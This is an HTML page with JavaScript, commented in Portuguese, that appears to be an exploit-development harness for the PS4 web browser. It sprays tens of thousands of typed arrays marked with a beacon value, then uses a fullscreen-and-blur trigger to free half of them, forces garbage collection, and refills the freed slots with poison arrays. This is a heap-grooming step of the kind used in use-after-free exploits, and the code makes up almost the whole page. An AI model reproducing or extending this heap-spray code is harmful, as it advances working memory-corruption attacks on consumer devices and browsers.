<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 Debugger V5: FORCE GC</title>
<style>
    body { background-color: #200; color: #f55; font-family: monospace; text-align: center; padding: 20px; }
    button { background: #800; color: white; border: 2px solid #f55; padding: 20px 40px; font-size: 1.5em; cursor: pointer; margin: 10px; }
    #log { text-align: left; margin: 20px auto; border: 1px solid #f55; padding: 10px; height: 300px; overflow-y: scroll; background: #000; }
</style>
</head>
<body>

<h1>DEBUGGER V5: FORCE GARBAGE COLLECTION</h1>
<p>Estratégia: Criar buracos e PRESSIONAR a memória para reciclar.</p>

<button onclick="step1()">1. ALOCAR (BEACON)</button>
<br>
<button onclick="step2()">2. GATILHO (OPTIONS)</button>

<div id="log">Logs...</div>

<script>
    const Log = document.getElementById('log');
    function log(txt) { Log.innerHTML += ">> " + txt + "<br>"; Log.scrollTop = Log.scrollHeight;}

    const BEACON_VAL = 0xDEADBEEF; 
    const POISON_VAL = 0x41414141; 

    let victims = [];
    let spray_storage = [];
    const COUNT = 40000; 

    // Função dedicada para irritar o Garbage Collector
    function forceGC() {
        log("⚠️ FORÇANDO LIMPEZA DE MEMÓRIA (GC)...");
        for (let i = 0; i < 200; i++) {
            // Aloca blocos grandes (64KB) e joga fora imediatamente
            new ArrayBuffer(0x10000); 
        }
    }

    function step1() {
        log("Alocando 40.000 arrays...");
        for(let i=0; i<COUNT; i++) {
            let v = new Uint32Array(32);
            v.fill(BEACON_VAL);
            v[0] = i; 
            victims.push(v);
        }
        log("MEMÓRIA PRONTA! Faça o Scan de 'EFBEADDE'.");
    }

    function step2() {
        log("Gatilho armado...");
        const doc = document.documentElement;
        if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
        else if (doc.requestFullscreen) doc.requestFullscreen();

        window.onblur = function() {
            log("BLUR! Iniciando sequência crítica...");
            document.body.style.background = "#f00";

            // 1. FREE (Queijo Suíço)
            log("Liberando metade dos arrays...");
            for(let i=0; i<COUNT; i+=2) {
                victims[i] = null; 
            }

            // 2. FORCE GC (A novidade)
            // Tenta forçar o navegador a processar os 'nulls' acima
            forceGC(); 

            // 3. SPRAY
            log("Injetando Spray nos buracos reciclados...");
            try {
                for(let i=0; i<COUNT/2 + 2000; i++) {
                    let s = new Uint32Array(32); 
                    s.fill(POISON_VAL);
                    spray_storage.push(s);
                }
            } catch(e) {}

            log("PROCESSO CONCLUÍDO!");
            log("Verifique se a contagem caiu de 1.2M para ~600k.");
        };
    }
</script>
</body>
</html>
